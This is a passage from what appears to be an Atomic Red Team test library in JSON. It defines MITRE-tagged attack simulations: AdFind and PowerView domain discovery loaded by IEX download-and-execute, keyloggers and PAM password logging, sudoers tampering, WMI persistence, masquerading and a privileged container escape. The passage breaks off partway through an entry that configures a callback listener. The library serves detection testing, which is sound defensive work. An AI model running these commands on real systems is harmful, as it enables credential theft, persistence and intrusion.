				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -gcb -sc trustdmp\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Get-DomainTrust with PowerView",
		"auto_generated_guid": "f974894c-5991-4b19-aaf5-7cc2fe298c5d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Get-ForestTrust with PowerView",
		"auto_generated_guid": "58ed10e8-0738-4651-8408-3a3e9a526279",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "TruffleSnout - Listing AD Infrastructure",
		"auto_generated_guid": "ea1b4f2d-5b82-4006-b64f-f2845608a3bf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"trufflesnout_path": {
				"description": "Path to the TruffleSnout executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe"
			},
			"domain": {
				"description": "Domain name to search on",
				"type": "string",
				"default": "%userdomain%"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})\n",
				"prereq_command": "if (Test-Path \"#{trufflesnout_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{trufflesnout_path}\") -Force | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe\" -OutFile \"#{trufflesnout_path}\"\n"
			}
		],
		"executor": {
			"command": "\"#{trufflesnout_path}\" forest -n #{domain}\n\"#{trufflesnout_path}\" domain -n #{domain}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Input Capture",
		"auto_generated_guid": "d9b633ca-8efb-45e6-b838-70f595c6ae26",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filepath": {
				"description": "Name of the local file, include path.",
				"type": "path",
				"default": "$env:TEMP\\key.log"
			}
		},
		"dependencies": [
			{
				"description": "Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"\n"
			}
		],
		"executor": {
			"command": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}\n",
			"cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Living off the land Terminal Input Capture on Linux with pam.d",
		"auto_generated_guid": "9c6bdb34-a89f-4b90-acb1-5970614c711b",
		"dependencies": [
			{
				"description": "Checking if pam_tty_audit.so is installed\n",
				"prereq_command": "test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n",
				"get_prereq_command": "echo \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n"
			}
		],
		"supported_platforms": ["linux"],
		"executor": {
			"command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth\n",
			"cleanup_command": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Logging bash history to syslog",
		"auto_generated_guid": "0e59d59d-3265-4d35-bebd-bf5c1ec40db5",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "This test requires to be run in a bash shell and that logger and tee are installed.\n",
				"prereq_command": "if [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v tee)\" ]; then echo -e \"\\n***** tee NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n",
			"cleanup_command": "unset PROMPT_COMMAND\n"
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Logging sh history to syslog/messages",
		"auto_generated_guid": "b04284dc-3bd9-4840-8d21-61b8d31c99f2",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "This test requires to be run in a bash shell and that logger and tee are installed.\n",
				"prereq_command": "if [ \"$(echo $SHELL)\" != \"/bin/sh\" ]; then echo -e \"\\n***** sh not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n",
			"cleanup_command": "unset PS2\n"
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Bash session based keylogger",
		"auto_generated_guid": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "This test requires to be run in a bash shell\n",
				"prereq_command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"input_arguments": {
			"output_file": {
				"description": "File to store captured commands",
				"type": "string",
				"default": "/tmp/.keyboard.log"
			}
		},
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n"
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "SSHD PAM keylogger",
		"auto_generated_guid": "81d7d2ad-d644-4b6a-bea7-28ffe43becca",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "This test requires sshd and auditd\n",
				"prereq_command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"input_arguments": {
			"user_account": {
				"description": "Basic ssh user account for testing.",
				"type": "string",
				"default": "ubuntu"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n",
			"cleanup_command": "cp -fv /tmp/sshd /etc/pam.d/\n"
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Auditd keylogger",
		"auto_generated_guid": "a668edb9-334e-48eb-8c2e-5413a40867af",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "This test requires sshd and auditd\n",
				"prereq_command": "if [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\") \n",
			"cleanup_command": "systemctl restart auditd\n"
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "MacOS Swift Keylogger",
		"auto_generated_guid": "aee3a097-4c5c-4fff-bbd3-0a705867ae29",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"swift_src": {
				"description": "Location of swift script",
				"type": "path",
				"default": "PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.\n",
				"prereq_command": "if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else exit 1; fi\n",
				"get_prereq_command": "echo \"\"\n"
			}
		],
		"executor": {
			"command": "swift #{swift_src} -keylog\n",
			"cleanup_command": "kill `pgrep swift-frontend`\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1056.001",
		"phases": ["collection", "credential-access"]
	},
	{
		"name": "Sudo usage",
		"auto_generated_guid": "150c3a08-ee6e-48a6-aeaf-3659d24ceb4e",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n"
		},
		"attack_technique": "T1548.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Sudo usage (freebsd)",
		"auto_generated_guid": "2bf9a018-4664-438a-b435-cc6f8c6f71b1",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if sudo is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y sudo)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers\n"
		},
		"attack_technique": "T1548.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Unlimited sudo cache timeout",
		"auto_generated_guid": "a7b17659-dd5e-46f7-b7d1-e6792c91d0bc",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n"
		},
		"attack_technique": "T1548.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Unlimited sudo cache timeout (freebsd)",
		"auto_generated_guid": "a83ad6e8-6f24-4d7f-8f44-75f8ab742991",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if sudo is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y sudo)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers\nsudo visudo -c -f /usr/local/etc/sudoers\n"
		},
		"attack_technique": "T1548.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable tty_tickets for sudo caching",
		"auto_generated_guid": "91a60b03-fb75-4d24-a42e-2eb8956e8de1",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n"
		},
		"attack_technique": "T1548.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Disable tty_tickets for sudo caching (freebsd)",
		"auto_generated_guid": "4df6a0fe-2bdd-4be8-8618-a6a19654a57a",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if sudo is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y sudo)\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /usr/local/etc/sudoers\"\nsudo visudo -c -f /usr/local/etc/sudoers\n"
		},
		"attack_technique": "T1548.003",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "USB Malware Spread Simulation",
		"auto_generated_guid": "d44b7297-622c-4be8-ad88-ec40d7563c75",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"command": "$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nwrite-host \"Removable Drive Found:\" $Drive\nNew-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}\n",
			"cleanup_command": "$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nRemove-Item -Path $Drive\\T1091Test1.txt -Force -ErrorAction Ignore\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1091",
		"phases": ["initial-access", "lateral-movement"]
	},
	{
		"name": "Persistence via WMI Event Subscription - CommandLineEventConsumer",
		"auto_generated_guid": "3c64f177-28e2-49eb-a799-d767b24dd1e0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n",
			"cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Persistence via WMI Event Subscription - ActiveScriptEventConsumer",
		"auto_generated_guid": "fecd0dfd-fb55-45fa-a10b-6250272d0832",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\n",
			"cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1546.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Windows MOFComp.exe Load MOF File",
		"auto_generated_guid": "29786d7e-8916-4de6-9c55-be7b093b2706",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"mofcomp_path": {
				"description": "Location of mofcomp.exe",
				"type": "string",
				"default": "c:\\windows\\system32\\wbem\\mofcomp.exe"
			},
			"mof_file": {
				"description": "Local location MOF file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1546.003\\src\\T1546.003.mof"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "MofComp.exe must exist on disk at specified location (#{mofcomp_path})\n",
				"prereq_command": "if (Test-Path \"#{mofcomp_path}\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "Validate MOFComp.exe is on disk somewhere and update input argument.\n"
			},
			{
				"description": "MofComp.exe must exist on disk at specified location (#{mof_file})\n",
				"prereq_command": "if (Test-Path \"#{mof_file}\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{mof_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof\" -OutFile \"#{mof_file}\"\n"
			}
		],
		"executor": {
			"command": "#{mofcomp_path} \"#{mof_file}\"\n",
			"cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam_consumer'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam_filter'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "using device audio capture commandlet",
		"auto_generated_guid": "9c3ad250-b185-4444-b5a9-d69218a10c95",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1123",
		"phases": ["collection"]
	},
	{
		"name": "Registry artefact when application use microphone",
		"auto_generated_guid": "7a21cce2-6ada-4f7c-afd9-e1e9c481e44a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n",
			"cleanup_command": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1123",
		"phases": ["collection"]
	},
	{
		"name": "using Quicktime Player",
		"auto_generated_guid": "c7a0bb71-70ce-4a53-b115-881f241b795b",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"filename": {
				"description": "Location of the script",
				"type": "path",
				"default": "PathToAtomicsFolder/T1123/src/T1123.sh"
			},
			"audiofile": {
				"description": "Location of the recorded audio file",
				"type": "path",
				"default": "/tmp/T1123.m4a"
			},
			"duration": {
				"description": "Length of recording to make in seconds",
				"type": "integer",
				"default": 5
			}
		},
		"executor": {
			"command": "sh #{filename} #{audiofile} #{duration}\n",
			"cleanup_command": "if test -w #{audiofile}; then\n  rm #{audiofile}\nfi\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1123",
		"phases": ["collection"]
	},
	{
		"name": "Space After Filename (Manual)",
		"auto_generated_guid": "89a7dd26-e510-4c9f-9b15-f3bae333360f",
		"supported_platforms": ["macos"],
		"executor": {
			"steps": "1. echo '#!/bin/bash\\necho \"print \\\"hello, world!\\\"\" | /usr/bin/python\\nexit' > execute.txt && chmod +x execute.txt\n\n2. mv execute.txt \"execute.txt \"\n\n3. ./execute.txt\\ \n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1036.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Space After Filename",
		"auto_generated_guid": "b95ce2eb-a093-4cd8-938d-5258cef656ea",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"name": "sh",
			"command": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n[ \"$(uname)\" = 'FreeBSD' ] && /bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \" || /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n",
			"cleanup_command": "rm -rf /tmp/atomic-test-T1036.006",
			"elevation_required": false
		},
		"attack_technique": "T1036.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Deploy container using nsenter container escape",
		"auto_generated_guid": "0b2f9520-a17a-4671-9dba-3bd034099fff",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify docker service is running.",
				"prereq_command": "sudo systemctl status docker\n",
				"get_prereq_command": "sudo systemctl start docker\n"
			},
			{
				"description": "Verify kind is in the path.",
				"prereq_command": "which kind\n",
				"get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"
			},
			{
				"description": "Verify kind-atomic-cluster is created",
				"prereq_command": "sudo kind get clusters\n",
				"get_prereq_command": "sudo kind create cluster --name atomic-cluster\n"
			},
			{
				"description": "Verify kubectl is in path",
				"prereq_command": "which kubectl\n",
				"get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"
			}
		],
		"executor": {
			"command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n",
			"name": "sh",
			"cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod\n",
			"elevation_required": false
		},
		"attack_technique": "T1611",
		"phases": ["privilege-escalation"]
	},
	{
		"name": "Mount host filesystem to escape privileged Docker container",
		"auto_generated_guid": "6c499943-b098-4bc6-8d38-0956fc182984",
		"supported_platforms": ["containers"],
		"input_arguments": {
			"mount_device": {
				"description": "Path to the device of the host's disk to mount",
				"type": "path",
				"default": "/dev/dm-0"
			},
			"mount_point": {
				"description": "Path where the host filesystem will be mounted",
				"type": "path",
				"default": "/mnt/T1611.002"
			},
			"cron_path": {
				"description": "Path on the host filesystem where cron jobs are stored",
				"type": "path",
				"default": "/etc/cron.d"
			},
			"cron_filename": {
				"description": "Filename of the cron job in cron_path",
				"type": "string",
				"default": "T1611_002"
			},
			"listen_address": {
				"description": "IP address to listen for callback from the host system.",
				"type": "string",
				"default": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
			},
			"listen_port": {
				"description": "TCP Port to listen on for callback from the host system.",
				"type": "integer",
				"default": 4444
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify mount is installed.",
				"prereq_command": "which mount\n",
				"get_prereq_command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n"
			},
			{
				"description": "Verify container is privileged.",
				"prereq_command": "capsh --print | grep cap_sys_admin\n",
